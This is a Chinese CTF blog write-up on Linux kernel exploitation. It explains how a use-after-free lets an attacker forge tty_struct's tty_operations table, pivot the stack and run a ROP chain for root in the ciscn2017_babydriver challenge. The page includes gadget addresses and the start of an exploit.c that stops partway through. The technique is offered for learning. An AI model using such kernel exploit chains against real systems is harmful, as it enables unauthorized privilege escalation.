@@ -1,0 +1,513 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/ha1vk/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/ha1vk/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/ha1vk/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/ha1vk/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/ha1vk/css/main.css">
+
+
+<link rel="stylesheet" href="/ha1vk/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"github.com","root":"/ha1vk/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="当用户打开ptmx驱动时，会分配一个tty_struct结构，它的结构如下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152struct tty_struct &#123;      int magic;      struct kref kref;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="linux kernel pwn学习之伪造tty_struct执行任意函数">
+<meta property="og:url" content="https://github.com/ha1vk/2020/02/29/linux_kernel_pwn_tty_struct/index.html">
+<meta property="og:site_name" content="ha1vk&#39;s blog">
+<meta property="og:description" content="当用户打开ptmx驱动时，会分配一个tty_struct结构，它的结构如下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152struct tty_struct &#123;      int magic;      struct kref kref;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://github.com/ha1vk/2020/02/29/linux_kernel_pwn_tty_struct/image1.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2020/02/29/linux_kernel_pwn_tty_struct/image2.png">
+<meta property="og:image" content="https://github.com/ha1vk/2020/02/29/linux_kernel_pwn_tty_struct/image3.JPG">
+<meta property="article:published_time" content="2020-02-29T09:05:11.000Z">
+<meta property="article:modified_time" content="2025-06-26T03:27:56.417Z">
+<meta property="article:author" content="ha1vk">
+<meta property="article:tag" content="ROP">
+<meta property="article:tag" content="UAF">
+<meta property="article:tag" content="Linux Kernel">
+<meta property="article:tag" content="tty_struct">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/ha1vk/2020/02/29/linux_kernel_pwn_tty_struct/image1.JPG">
+
+<link rel="canonical" href="https://github.com/ha1vk/2020/02/29/linux_kernel_pwn_tty_struct/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>linux kernel pwn学习之伪造tty_struct执行任意函数 | ha1vk's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/ha1vk/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">ha1vk's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/ha1vk/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/ha1vk/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/ha1vk/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/ha1vk/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/ha1vk/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2020/02/29/linux_kernel_pwn_tty_struct/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="name" content="ha1vk">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ha1vk's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          linux kernel pwn学习之伪造tty_struct执行任意函数
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-02-29 17:05:11" itemprop="dateCreated datePublished" datetime="2020-02-29T17:05:11+08:00">2020-02-29</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-06-26 11:27:56" itemprop="dateModified" datetime="2025-06-26T11:27:56+08:00">2025-06-26</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>当用户打开ptmx驱动时，会分配一个tty_struct结构，它的结构如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span>  </span><br><span class="line">    <span class="type">int</span> magic;  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>;</span>  </span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span>  </span><br><span class="line">    <span class="type">int</span> index;  </span><br><span class="line">    <span class="comment">/* Protects ldisc changes: Lock tty not pty */</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ld_semaphore</span> <span class="title">ldisc_sem</span>;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_ldisc</span> *<span class="title">ldisc</span>;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">atomic_write_lock</span>;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">legacy_mutex</span>;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">throttle_mutex</span>;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">termios_rwsem</span>;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">winsize_mutex</span>;</span>  </span><br><span class="line">    <span class="type">spinlock_t</span> ctrl_lock;  </span><br><span class="line">    <span class="type">spinlock_t</span> flow_lock;  </span><br><span class="line">    <span class="comment">/* Termios values are protected by the termios rwsem */</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ktermios</span> <span class="title">termios</span>, <span class="title">termios_locked</span>;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">termiox</span> *<span class="title">termiox</span>;</span>    <span class="comment">/* May be NULL for unsupported */</span>  </span><br><span class="line">    <span class="type">char</span> name[<span class="number">64</span>];  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">pgrp</span>;</span>       <span class="comment">/* Protected by ctrl lock */</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">session</span>;</span>  </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> flags;  </span><br><span class="line">    <span class="type">int</span> count;  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">winsize</span> <span class="title">winsize</span>;</span>     <span class="comment">/* winsize_mutex */</span>  </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stopped:<span class="number">1</span>,    <span class="comment">/* flow_lock */</span>  </span><br><span class="line">              flow_stopped:<span class="number">1</span>,  </span><br><span class="line">              unused:BITS_PER_LONG - <span class="number">2</span>;  </span><br><span class="line">    <span class="type">int</span> hw_stopped;  </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> ctrl_status:<span class="number">8</span>,    <span class="comment">/* ctrl_lock */</span>  </span><br><span class="line">              packet:<span class="number">1</span>,  </span><br><span class="line">              unused_ctrl:BITS_PER_LONG - <span class="number">9</span>;  </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> receive_room;  <span class="comment">/* Bytes free for queue */</span>  </span><br><span class="line">    <span class="type">int</span> flow_change;  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">link</span>;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync</span>;</span>  </span><br><span class="line">    <span class="type">wait_queue_head_t</span> write_wait;  </span><br><span class="line">    <span class="type">wait_queue_head_t</span> read_wait;  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">hangup_work</span>;</span>  </span><br><span class="line">    <span class="type">void</span> *disc_data;  </span><br><span class="line">    <span class="type">void</span> *driver_data;  </span><br><span class="line">    <span class="type">spinlock_t</span> files_lock;      <span class="comment">/* protects tty_files list */</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">tty_files</span>;</span>  </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N_TTY_BUF_SIZE 4096  </span></span><br><span class="line">    <span class="type">int</span> closing;  </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *write_buf;  </span><br><span class="line">    <span class="type">int</span> write_cnt;  </span><br><span class="line">    <span class="comment">/* If the tty has a pending do_SAK, queue it here - akpm */</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">SAK_work</span>;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_port</span> *<span class="title">port</span>;</span>  </span><br><span class="line">&#125; __randomize_layout;  </span><br></pre></td></tr></table></figure>
+
+<p>其中有一个**[const struct tty_operations *ops]{.mark}**指针，它是一个tty_operations指针，而tty_operations结构体里是一些列对驱动操作的函数指针。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,  </span></span><br><span class="line"><span class="class">            <span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span>  </span><br><span class="line">    <span class="type">int</span>  (*install)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);  </span><br><span class="line">    <span class="type">void</span> (*remove)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);  </span><br><span class="line">    <span class="type">int</span>  (*open)(<span class="keyword">struct</span> tty_struct * tty, <span class="keyword">struct</span> file * filp);  </span><br><span class="line">    <span class="type">void</span> (*close)(<span class="keyword">struct</span> tty_struct * tty, <span class="keyword">struct</span> file * filp);  </span><br><span class="line">    <span class="type">void</span> (*shutdown)(<span class="keyword">struct</span> tty_struct *tty);  </span><br><span class="line">    <span class="type">void</span> (*cleanup)(<span class="keyword">struct</span> tty_struct *tty);  </span><br><span class="line">    <span class="type">int</span>  (*write)(<span class="keyword">struct</span> tty_struct * tty,  </span><br><span class="line">              <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *buf, <span class="type">int</span> count);  </span><br><span class="line">    <span class="type">int</span>  (*put_char)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">unsigned</span> <span class="type">char</span> ch);  </span><br><span class="line">    <span class="type">void</span> (*flush_chars)(<span class="keyword">struct</span> tty_struct *tty);  </span><br><span class="line">    <span class="type">int</span>  (*write_room)(<span class="keyword">struct</span> tty_struct *tty);  </span><br><span class="line">    <span class="type">int</span>  (*chars_in_buffer)(<span class="keyword">struct</span> tty_struct *tty);  </span><br><span class="line">    <span class="type">int</span>  (*ioctl)(<span class="keyword">struct</span> tty_struct *tty,  </span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);  </span><br><span class="line">    <span class="type">long</span> (*compat_ioctl)(<span class="keyword">struct</span> tty_struct *tty,  </span><br><span class="line">                 <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);  </span><br><span class="line">    <span class="type">void</span> (*set_termios)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> ktermios * old);  </span><br><span class="line">    <span class="type">void</span> (*throttle)(<span class="keyword">struct</span> tty_struct * tty);  </span><br><span class="line">    <span class="type">void</span> (*unthrottle)(<span class="keyword">struct</span> tty_struct * tty);  </span><br><span class="line">    <span class="type">void</span> (*stop)(<span class="keyword">struct</span> tty_struct *tty);  </span><br><span class="line">    <span class="type">void</span> (*start)(<span class="keyword">struct</span> tty_struct *tty);  </span><br><span class="line">    <span class="type">void</span> (*hangup)(<span class="keyword">struct</span> tty_struct *tty);  </span><br><span class="line">    <span class="type">int</span> (*break_ctl)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> state);  </span><br><span class="line">    <span class="type">void</span> (*flush_buffer)(<span class="keyword">struct</span> tty_struct *tty);  </span><br><span class="line">    <span class="type">void</span> (*set_ldisc)(<span class="keyword">struct</span> tty_struct *tty);  </span><br><span class="line">    <span class="type">void</span> (*wait_until_sent)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> timeout);  </span><br><span class="line">    <span class="type">void</span> (*send_xchar)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">char</span> ch);  </span><br><span class="line">    <span class="type">int</span> (*tiocmget)(<span class="keyword">struct</span> tty_struct *tty);  </span><br><span class="line">    <span class="type">int</span> (*tiocmset)(<span class="keyword">struct</span> tty_struct *tty,  </span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> <span class="built_in">set</span>, <span class="type">unsigned</span> <span class="type">int</span> clear);  </span><br><span class="line">    <span class="type">int</span> (*resize)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> winsize *ws);  </span><br><span class="line">    <span class="type">int</span> (*set_termiox)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> termiox *tnew);  </span><br><span class="line">    <span class="type">int</span> (*get_icount)(<span class="keyword">struct</span> tty_struct *tty,  </span><br><span class="line">                <span class="keyword">struct</span> serial_icounter_struct *icount);  </span><br><span class="line">    <span class="type">void</span> (*show_fdinfo)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> seq_file *m);  </span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_CONSOLE_POLL  </span></span><br><span class="line">    <span class="type">int</span> (*poll_init)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line, <span class="type">char</span> *options);  </span><br><span class="line">    <span class="type">int</span> (*poll_get_char)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line);  </span><br><span class="line">    <span class="type">void</span> (*poll_put_char)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line, <span class="type">char</span> ch);  </span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>  </span></span><br><span class="line">    <span class="type">int</span> (*proc_show)(<span class="keyword">struct</span> seq_file *, <span class="type">void</span> *);  </span><br><span class="line">&#125; __randomize_layout;  </span><br></pre></td></tr></table></figure>
+
+<p>比如，我们对ptmx驱动进行write操作时，就会调用这个里面的write指针指向的函数。也就是，我们如果能**[伪造tty_operations结构体，将里面的指针指向我们需要执行的函数]{.mark}<strong>。然后将tty_struct结构体里的</strong>[const struct tty_operations *ops]{.mark}<strong>指针指向我们伪造的tty_operations结构体，然后对驱动执行对应的操作，比如write，就能触发函数的执行。</strong>[而tty_struct结构体，我们可以通过漏洞来控制]{.mark}<strong>，然后修改指针。</strong>[这种思想，就如同是glibc下的house of orange]{.mark}**，house of orange是伪造vtable表，而我们这里，同样是伪造函数表。为了加深理解，我们以ciscn2017_babydriver为例，之前，我们利用UAF修改了cred结构，这次，我们用同样的方法，修改tty_struct结构。</p>
+<h1 id="ciscn2017-babydriver"><a href="#ciscn2017-babydriver" class="headerlink" title="ciscn2017_babydriver"></a>ciscn2017_babydriver</h1><p>阅读对应版本的linux内核源码，我们发现,<strong>tty_struct结构体的大小为0x2E0。[为了实现执行的目的，我们可以利用ROP]{.mark}</strong>,但是本题没有栈溢出，我们可以**[伪造tty_operations里面对应的函数的来将栈转移到我们可以控制的地方]{.mark}**。为了清楚对应的函数被调用前的各个寄存器的值，以方便我们后续的分析，我们先将tty_operations[7]伪造为babydriver里的babyread函数的地址。查看结构体，tty_operations[7]也就是对驱动进行write操作时的处理函数的指针。我们现在把它伪造指向了babyread，然后利用gdb调试，对ptmx驱动执行write操作，在babyread函数前断点。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">35</span>;i++) &#123;  </span><br><span class="line">   fake_tty_operations[i] = <span class="number">0xffffffffc0000000</span> + i;  </span><br><span class="line">&#125;  </span><br><span class="line">fake_tty_operations[<span class="number">7</span>] = <span class="number">0xffffffffc0000130</span>;  <span class="comment">//babyread的函数地址</span></span><br></pre></td></tr></table></figure>
+
+<img src="/ha1vk/2020/02/29/linux_kernel_pwn_tty_struct/image1.JPG" class="">
+
+<p>然后，执行exp，在babyread下断了下来，我们查看各个寄存器的值，发现rax正好指向我们的fake_tty_operations，</p>
+<img src="/ha1vk/2020/02/29/linux_kernel_pwn_tty_struct/image2.png" class="">
+
+<p>因此，我们只需要把fake_tty_operations[7]伪造成gadgets</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov rsp,rax;  </span><br><span class="line">...........  </span><br><span class="line">ret  </span><br></pre></td></tr></table></figure>
+
+<p>这样，我<strong>们对驱动执行write操作时，就能够将栈转移到我们用户的fake_tty_operations空间里</strong>，我们<strong>在这里面再布置一个栈转移的gadgets，将栈最终转移到我们的rop数组里</strong>，执行rop。</p>
+<p>完成这些以后，就是常规ROP操作了。我们最终的exploit.c程序</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span>  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment">//tty_struct结构体的大小  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TTY_STRUCT_SIZE 0x2E0  </span></span><br><span class="line"><span class="comment">//mov cr4, rdi ; pop rbp ; ret  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MOV_CR4_RDI 0xffffffff81004d80  </span></span><br><span class="line"><span class="comment">//pop rdi ; ret  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI 0xffffffff810d238d  </span></span><br><span class="line"><span class="comment">//swapgs ; pop rbp ; ret  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS 0xffffffff81063694  </span></span><br><span class="line"><span class="comment">//iretq  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRETQ 0xFFFFFFFF8181A797  </span></span><br><span class="line"><span class="comment">//commit_creds函数  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS 0xffffffff810a1420  </span></span><br><span class="line"><span class="comment">// prepare_kernel_cred  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810a1810  </span></span><br><span class="line"><span class="comment">//mov rsp, rax;dec ebx;ret，做栈迁移用  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MOV_RSP_RAX 0xFFFFFFFF8181BFC5  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RAX 0xffffffff8100ce6e  </span></span><br><span class="line">  </span><br><span class="line"><span class="type">void</span> <span class="title function_">getRoot</span><span class="params">()</span> &#123;  </span><br><span class="line">   <span class="comment">//函数指针  </span></span><br><span class="line">   <span class="type">void</span> 